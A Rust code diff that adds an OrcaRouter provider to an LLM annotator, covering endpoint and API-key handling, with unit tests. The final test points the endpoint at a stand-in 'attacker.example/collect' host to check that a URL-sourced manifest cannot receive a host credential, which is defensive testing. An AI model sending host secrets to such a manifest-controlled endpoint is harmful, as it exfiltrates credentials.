@@ -141,6 +141,7 @@ struct LlmConfig {
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum LlmProvider {
     OpenAi,
+    OrcaRouter,
     OpenAiCompatible,
     AzureOpenAi,
     Bedrock,
@@ -152,6 +153,7 @@ impl LlmProvider {
     fn parse(value: Option<&str>) -> Result<Self, String> {
         match value.unwrap_or("openai").to_ascii_lowercase().as_str() {
             "openai" => Ok(Self::OpenAi),
+            "orcarouter" => Ok(Self::OrcaRouter),
             "openai_compatible" | "openai-compatible" | "compatible" => Ok(Self::OpenAiCompatible),
             "azure_openai" | "azure-openai" => Ok(Self::AzureOpenAi),
             "bedrock" | "aws_bedrock" | "aws-bedrock" => Ok(Self::Bedrock),
@@ -207,6 +209,7 @@ impl LlmConfig {
             .unwrap_or(match provider {
                 LlmProvider::Gemini => "gemini-1.5-flash",
                 LlmProvider::Ollama => "llama3.1",
+                LlmProvider::OrcaRouter => "orcarouter/auto",
                 _ => DEFAULT_MODEL,
             })
             .to_string();
@@ -300,6 +303,7 @@ fn request_for_provider(
 ) -> Result<TransportRequest, RuntimeError> {
     match cfg.provider {
         LlmProvider::OpenAi => openai_request(annotator_name, cfg, policy_target, true),
+        LlmProvider::OrcaRouter => openai_request(annotator_name, cfg, policy_target, true),
         LlmProvider::OpenAiCompatible => openai_request(annotator_name, cfg, policy_target, false),
         LlmProvider::AzureOpenAi => azure_openai_request(annotator_name, cfg, policy_target),
         LlmProvider::Bedrock => bedrock_request(annotator_name, cfg, policy_target),
@@ -325,12 +329,31 @@ fn openai_request(
     policy_target: &str,
     require_default_key: bool,
 ) -> Result<TransportRequest, RuntimeError> {
-    let url = cfg
-        .endpoint
-        .as_deref()
-        .or(cfg.base_url.as_deref())
-        .unwrap_or(DEFAULT_OPENAI_CHAT_COMPLETIONS_URL)
-        .to_string();
+    let default_url = match cfg.provider {
+        LlmProvider::OrcaRouter => DEFAULT_ORCAROUTER_CHAT_COMPLETIONS_URL,
+        _ => DEFAULT_OPENAI_CHAT_COMPLETIONS_URL,
+    };
+    let url = match (
+        cfg.provider,
+        cfg.endpoint.as_deref(),
+        cfg.base_url.as_deref(),
+    ) {
+        // An OrcaRouter `base_url` points at the gateway root, so append the
+        // chat completions path unless it already carries it.
+        (LlmProvider::OrcaRouter, None, Some(base_url)) => {
+            if base_url.contains("/chat/completions") {
+                base_url.to_string()
+            } else {
+                format!("{}/chat/completions", base_url.trim_end_matches('/'))
+            }
+        }
+        _ => cfg
+            .endpoint
+            .as_deref()
+            .or(cfg.base_url.as_deref())
+            .unwrap_or(default_url)
+            .to_string(),
+    };
     let body = merge_provider_config(
         json!({
             REQUEST_MODEL: cfg.model,
@@ -343,7 +366,11 @@ fn openai_request(
         &cfg.provider_config,
     );
     let mut request = base_request(cfg, url).json(body);
-    let default_env = require_default_key.then_some(DEFAULT_OPENAI_API_KEY_ENV);
+    let default_env = match (require_default_key, cfg.provider) {
+        (true, LlmProvider::OrcaRouter) => Some(DEFAULT_ORCAROUTER_API_KEY_ENV),
+        (true, _) => Some(DEFAULT_OPENAI_API_KEY_ENV),
+        (false, _) => None,
+    };
     if let Some(api_key) = cfg.secret_from_field_or_env(annotator_name, default_env)? {
         request = request.header(
             cfg.api_key_header
@@ -537,9 +564,10 @@ fn annotation_from_provider_response(
     response: JsonValue,
 ) -> Result<JsonValue, RuntimeError> {
     let raw = match cfg.provider {
-        LlmProvider::OpenAi | LlmProvider::OpenAiCompatible | LlmProvider::AzureOpenAi => {
-            extract_openai_content(&response)
-        }
+        LlmProvider::OpenAi
+        | LlmProvider::OrcaRouter
+        | LlmProvider::OpenAiCompatible
+        | LlmProvider::AzureOpenAi => extract_openai_content(&response),
         LlmProvider::Gemini => extract_gemini_content(&response),
         LlmProvider::Ollama => extract_ollama_content(&response),
         LlmProvider::Bedrock => extract_bedrock_content(&response),
@@ -968,6 +996,119 @@ mod tests {
             request.body[REQUEST_RESPONSE_FORMAT][REQUEST_RESPONSE_FORMAT_TYPE],
             json!(RESPONSE_FORMAT_JSON_OBJECT)
         );
+    }
+
+    #[test]
+    fn orcarouter_default_uses_gateway_endpoint_key_and_model() {
+        std::env::set_var("ACS_ORCAROUTER_DEFAULT_TEST_KEY", "sk-orca-test");
+        let (output, request) = dispatch(
+            annotator(&[
+                (FIELD_PROVIDER, json!("orcarouter")),
+                (FIELD_API_KEY_ENV, json!("ACS_ORCAROUTER_DEFAULT_TEST_KEY")),
+            ]),
+            r#"{"choices":[{"message":{"content":"{\"label\":\"safe\"}"}}]}"#,
+        );
+
+        assert_eq!(output["label"], json!("safe"));
+        assert_eq!(request.url, DEFAULT_ORCAROUTER_CHAT_COMPLETIONS_URL);
+        assert_eq!(request.headers[HEADER_AUTHORIZATION], "Bearer sk-orca-test");
+        assert_eq!(request.body[REQUEST_MODEL], json!("orcarouter/auto"));
+        assert_eq!(
+            request.body[REQUEST_RESPONSE_FORMAT][REQUEST_RESPONSE_FORMAT_TYPE],
+            json!(RESPONSE_FORMAT_JSON_OBJECT)
+        );
+    }
+
+    #[test]
+    fn orcarouter_supports_explicit_endpoint_and_key() {
+        std::env::set_var("ACS_ORCAROUTER_EXPLICIT_TEST_KEY", "sk-orca-explicit");
+        let (output, request) = dispatch(
+            annotator(&[
+                (FIELD_PROVIDER, json!("orcarouter")),
+                (
+                    FIELD_ENDPOINT,
+                    json!("https://api.orcarouter.ai/v1/chat/completions"),
+                ),
+                (FIELD_MODEL, json!("orcarouter/fusion")),
+                (FIELD_API_KEY_ENV, json!("ACS_ORCAROUTER_EXPLICIT_TEST_KEY")),
+            ]),
+            r#"{"choices":[{"message":{"content":"{\"label\":\"deny\"}"}}]}"#,
+        );
+
+        assert_eq!(output["label"], json!("deny"));
+        assert_eq!(request.url, "https://api.orcarouter.ai/v1/chat/completions");
+        assert_eq!(
+            request.headers[HEADER_AUTHORIZATION],
+            "Bearer sk-orca-explicit"
+        );
+        assert_eq!(request.body[REQUEST_MODEL], json!("orcarouter/fusion"));
+    }
+
+    #[test]
+    fn orcarouter_base_url_appends_chat_completions() {
+        std::env::set_var("ACS_ORCAROUTER_BASE_URL_TEST_KEY", "sk-orca-base");
+        let (_output, request) = dispatch(
+            annotator(&[
+                (FIELD_PROVIDER, json!("orcarouter")),
+                (FIELD_BASE_URL, json!("https://api.orcarouter.ai/v1")),
+                (FIELD_API_KEY_ENV, json!("ACS_ORCAROUTER_BASE_URL_TEST_KEY")),
+            ]),
+            r#"{"choices":[{"message":{"content":"{\"label\":\"safe\"}"}}]}"#,
+        );
+
+        assert_eq!(request.url, "https://api.orcarouter.ai/v1/chat/completions");
+        assert_eq!(request.headers[HEADER_AUTHORIZATION], "Bearer sk-orca-base");
+    }
+
+    #[test]
+    fn orcarouter_base_url_with_full_path_is_kept() {
+        std::env::set_var("ACS_ORCAROUTER_BASE_URL_FULL_TEST_KEY", "sk-orca-base-full");
+        let (_output, request) = dispatch(
+            annotator(&[
+                (FIELD_PROVIDER, json!("orcarouter")),
+                (
+                    FIELD_BASE_URL,
+                    json!("https://api.orcarouter.ai/v1/chat/completions"),
+                ),
+                (
+                    FIELD_API_KEY_ENV,
+                    json!("ACS_ORCAROUTER_BASE_URL_FULL_TEST_KEY"),
+                ),
+            ]),
+            r#"{"choices":[{"message":{"content":"{\"label\":\"safe\"}"}}]}"#,
+        );
+
+        assert_eq!(request.url, "https://api.orcarouter.ai/v1/chat/completions");
+        assert_eq!(
+            request.headers[HEADER_AUTHORIZATION],
+            "Bearer sk-orca-base-full"
+        );
+    }
+
+    #[test]
+    fn url_sourced_orcarouter_does_not_read_default_env_key() {
+        // Mirrors the openai url_sourced regression: a URL sourced manifest
+        // controls the endpoint, so the orcarouter default credential must not
+        // be read from the host environment and shipped there.
+        std::env::set_var("ORCAROUTER_API_KEY", "sk-host-orca-CONFIDENTIAL");
+        let attacker = json!("https://attacker.example/collect");
+        let body = r#"{"choices":[{"message":{"content":"{\"label\":\"safe\"}"}}]}"#;
+        let annotator = annotator(&[
+            (FIELD_PROVIDER, json!("orcarouter")),
+            (FIELD_ENDPOINT, attacker.clone()),
+        ]);
+        let transport = StubHttpTransport::with_response(200, body);
+        let result = LlmAnnotator::new()
+            .with_url_sourced(true)
+            .dispatch_with_transport("judge", &annotator, &pi(), &transport);
+        result.expect("dispatch completes without a host credential");
+        let request = transport.last_request().expect("request captured");
+        assert_eq!(request.url, "https://attacker.example/collect");
+        assert!(
+            !request.headers.contains_key(HEADER_AUTHORIZATION),
+            "URL sourced orcarouter manifest must not attach a host credential"
+        );
+        std::env::remove_var("ORCAROUTER_API_KEY");
     }
 
     fn try_dispatch_url_sourced(
